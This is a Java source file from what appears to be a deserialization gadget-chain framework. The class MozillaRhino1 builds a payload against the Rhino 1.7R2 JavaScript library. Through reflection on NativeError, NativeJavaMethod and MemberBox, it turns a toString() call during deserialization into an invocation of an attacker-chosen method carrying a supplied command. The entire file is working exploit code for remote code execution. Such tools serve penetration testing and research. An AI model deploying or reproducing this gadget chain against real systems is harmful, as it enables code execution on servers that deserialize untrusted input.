package org.ses.gadgetbuilder.chains1;

import org.mozilla.javascript.*;
import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

@Dependencies({"rhino:js:1.7R2"})
@Authors({ Authors.MATTHIASKAISER })
@Impact(Impact.MethodInvoke)
public class MozillaRhino1 extends MethodInvokeGadgetChain<ToStringTrampoline, MethodInvokeAdapter> {
    public MozillaRhino1(ToStringTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Object gadget = methodInvokeAdapter.getInvocationTarget(command);

        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        nativeErrorConstructor.setAccessible(true);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method newTransformer = Reflections.getMethod(gadget.getClass(), methodInvokeAdapter.getMethodName());


        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        getSlot.setAccessible(true);
        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
        Field getter = slot.getClass().getDeclaredField("getter");
        getter.setAccessible(true);

        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
        memberboxClassConstructor.setAccessible(true);
        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
        getter.set(slot, memberboxes);

        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, gadget, gadget.getClass());
        idScriptableObject.setPrototype(nativeObject);

        return new TrampolineConnector(idScriptableObject);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.mozilla.javascript.NativeError.toString()\n"+
                "org.mozilla.javascript.NativeError.js_toString()\n"+
                "org.mozilla.javascript.NativeError.getString()\n"+
                "org.mozilla.javascript.ScriptableObject.getProperty()\n"+
                "org.mozilla.javascript.IdScriptableObject.get()\n"+
                "org.mozilla.javascript.ScriptableObject.get()\n"+
                "org.mozilla.javascript.ScriptableObject.getImpl()\n"+
                "org.mozilla.javascript.NativeJavaMethod.call()\n"+
                "org.mozilla.javascript.MemberBox.invoke()\n"+
                "java.lang.reflect.Method.invoke()";
    }
}
